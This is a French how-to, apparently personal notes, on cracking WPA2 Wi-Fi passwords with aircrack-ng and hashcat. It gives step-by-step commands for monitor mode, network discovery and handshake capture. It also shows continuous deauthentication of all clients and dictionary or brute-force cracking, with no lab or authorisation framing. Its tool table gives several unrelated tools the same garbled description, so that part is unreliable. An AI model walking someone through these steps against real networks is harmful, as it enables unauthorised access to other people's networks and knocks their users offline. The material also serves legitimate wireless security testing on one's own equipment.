# Cracker le mdp d'un wifi

## Les types de wifi :

Il ya 3 types de réseau wifi : 

### WEP 

Les réseaux WEP pour Wired Equivalent Privacy ne sont normalement plus utilisés car ils a été prouvé qu'ils ont une faille de sécurité qui permet, après avoir capturé assez de paquets, de faire une attaque statistique pour déterminer le mdp.

### WPA2-PSK

Les réseaux Wifi auxquels vous vous connectez en fournissant un mot de passe qui est le même pour tout le monde

### WPA2-EAP

Réseaux Wifi auxquels vous vous authentifiez en fournissant un nom d'utilisateur et un mot de passe, qui sont envoyés à un serveur RADIUS(Un serveur pour l'authentification des clients, pas seulement pour le wifi).

## Type d'authentification

Les réseaux WPA2 utilise une authentification appelée 4-way handshake. Globalement, sans rentrer dans les détails ça permet au client et à l'AP de prouver qu'ils connaissent la clé, sans se le dire l'un à l'autre. Le WPA et le WPA2 utilisent pratiquement la même méthode d'authentification, de sorte que les attaques sont les mêmes.

## Vulnérabilité

Il n'y en a pas de connu pour le WPA2, il faut donc passer par une attaque bruteforce.
A noter que le nombre de caractère minimal pour un mdp de WPA2 c'est 8.

Les clés du WPA sont dérivées de l'ESSID (Un SSID (Le "nom" du réseau que vous voyez lorsque vous essayez de vous connecter) qui *peut* s'appliquer à plusieurs points d'accès, par exemple un bureau d'entreprise, formant normalement un réseau plus grand. Pour Aircrack, ils font normalement référence au réseau que vous attaquez.) et du mot de passe du réseau. L'ESSID agit comme un sel, ce qui rend les attaques par dictionnaire plus difficiles. Cela signifie que pour un mot de passe donné, la clé variera toujours pour chaque point d'accès. Cela signifie qu'à moins de calculer à l'avance le dictionnaire pour ce seul point d'accès/adresse MAC, vous devrez essayer des mots de passe jusqu'à ce que vous trouviez le bon.

## Outil utilisé

Pour les réseaux wifi on va utiliser l'outil **aircrack-ng** pour le bruteforce : [site de l'outil](https://aircrack-ng.org)

### Package de aircrack-ng
Nom du package | Description
---------------|------------
aircrack-ng | outil de bruteforce
airmon-ng | outil pour mettre une interface en mode monitor
airodump-ng | outil pour capturer les paquets sur un réseau wifi
aireplay-ng | outil pour injecter des paquets sur un réseau wifi
airdecap-ng | outil pour décrypter les paquets capturés
airbase-ng | outil pour créer un point d'accès wifi
airtun-ng | outil pour créer un tunnel wifi
packetforge-ng | outil pour créer des paquets wifi
airdecloak-ng | outil pour décrypter les paquets capturés
airolib-ng | outil pour gérer les bases de données de mots de passe
airserv-ng | outil pour créer un serveur de capture de paquets
buddy-ng | outil pour créer un serveur de capture de paquets
ivstools | outil pour gérer les fi
chiers .ivs
easside-ng | outil pour décrypter les paquets capturés
tkiptun-ng | outil pour décrypter les paquets capturés
wesside-ng | outil pour décrypter les paquets capturés

## Attaque de réseau WPA

### Mettre l'interface réseau en mode monitor

Si l'interface réseau n'est pas en mode monitor, on va utiliser l'outil **airmon-ng** pour la mettre en mode monitor (petit tips : pour voir l'état de l'interface réseau sans fil on peut utiliser la commande `iwconfig`). 

La première étape est de terminer tous les processus qui utilisent l'interface réseau sans fil. Pour cela, on va utiliser la commande suivante : 

```bash
airmon-ng check kill
```

Ensuite, on va mettre l'interface réseau sans fil en mode monitor.
Pour cela, on va utiliser la commande suivante :

```bash
airmon-ng start <interface>
```
Exemple avec wlan0 :

```bash
airmon-ng start wlan0
```
Le nom de l'interface réseau sans fil en mode monitor est le nom de l'interface réseau sans fil suivi de **mon**. Exemple : **wlan0**  devient **wlan0mon**

### Découvrir les réseaux wifi

Pour découvrir les réseaux wifi à proximité, on va utiliser l'outil **airodump-ng**. Pour cela, on va utiliser la commande suivante :

```bash
airodump-ng <interface>
```
Petit rappel, il faut que l'interface soit en mode monitor soit avec le **mon** à la fin du nom de l'interface.

Si on ne veut afficher qu'une seule adresse MAC, on peut utiliser la commande suivante :

```bash
airodump-ng <interface> --bssid <bssid>
```
ou 
    
```bash
airodump-ng <interface> -d <MAC address>
```


### Capturer les paquets

Pour attaquer un réseau wifi WPA, il faut d'abord capturer le handshake. Pour cela, on va utiliser l'outil **airodump-ng** qui va nous permettre de capturer les paquets qui transitent sur le réseau wifi. Pour cela, on va utiliser la commande suivante :

```bash
airodump-ng <interface> -c <channel> --bssid <bssid> -w <file>
```
Flag | Description
-----|------------
interface | nom de l'interface réseau sans fil en mode monitor
channel | canal du réseau wifi
bssid | adresse MAC du point d'accès
file | nom du fichier de sortie dans lequel va s'écrire les paquets capturés

### Déauthentifier un client

Pendant que la commande de capture de paquet est lancée, on va utiliser l'outil **aireplay-ng** pour déauthentifier un client du réseau wifi. Cela va obliger le client à se réauthentifier. Si tout se passe bien, on devrait capturer cette réauthentification dans notre fichier de sortie de airodump-ng.
Pour déauthentifier un client, on va utiliser la commande suivante :

```bash
aireplay-ng --deauth 0 -a <bssid> -D <interface>
```
Ci-dessus, on déauthentifie tous les clients du réseau wifi. Si on veut déauthentifier un seul client, on peut utiliser la commande suivante :

```bash
aireplay-ng --deauth 0 -a <bssid> -c <client> <interface>
```



Flag | Description
-----|------------
deauth | nombre de déauthentification à envoyer (0 signifie une attaque continue)
a | adresse MAC du point d'accès
interface | nom de l'interface réseau sans fil en mode monitor
c | adresse MAC du client à déauthentifier

En cas d'erreur : `wlan0mon is on channel 3, but the AP uses channel 11` on peut utiliser la commande suivante :

```bash
sudo airmon-ng start wlan0mon 3
```
Puis relancer la commande de déauthentification.

### Retirer le mode monitor

Une fois que l'on a capturé le handshake, on peut retirer le mode monitor de l'interface réseau sans fil. Pour cela, on va utiliser la commande suivante :

```bash
airmon-ng stop <interface>
```

### Lire les résultats capturés (non obligatoire)

On a donné un nom à notre fichier de sortie. Cela va générer 5 fichiers :
- <file>.csv
- <file>-01.cap
- <file>-01.csv
- <file>-01.kismet.csv

Le fichier qui nous intéresse est le fichier **<file>-01.cap**. C'est dans ce fichier que se trouve le handshake.

On utilise peut donc Wireshark pour lire le fichier **<file>-01.cap**. On peut utiliser la commande suivante :

```bash
wireshark <file>-01.cap
```

On met un filtre pour identifier le handshake : **eapol** (le handshake est composé de 4 paquets eapol).

Et on cherche la suite des 4 paquets numérotés de 1 à 4.

### Cracker le handshake - Dictionnaire

Pour cracker le handshake, on va utiliser l'outil **aircrack-ng**. Pour cela, on va utiliser la commande suivante :

```bash
aircrack-ng <file>-01.cap -w <wordlist>
```
Laisser tourner ... ET VOILA !

Remarque : Cette technique fonctionne uniquement avec des mots de passe faibles. Pour des mots de passe plus complexes, il faut utiliser une autre technique. 

### Crack le handshake - Bruteforce (pour mdp non conventionnels)

Pour faire du bruteforce, on va utiliser **hashcat**. Mais pour ça il faut convertir le fichier contenant le hash du handshake en un format compréhensible par hashcat et correspondant au bon type de hash. Avant on aurait utilisé **cap2hccapx** mais maitenant le format hccapx n'est plus utilisé. Il faut le convertir en **hc22000**. Je l'ai fait en utilisant un site web (pas une bonne pratique du tout, il doit exister un outil)

Ensuite il faut lacer hashcat en précisant le type d'attaque (bruteforce ou dictionnaire ou les 2) et le type de hash (22000 pour du wpa/wpa2). 

```bash
hashcat -a <type d'attaque> -m 22000 <file>.hc22000 <wordlist>
```
**Pas besoin de wordlist si l'attaque est bruteforce uniquement (`-a 3`)**
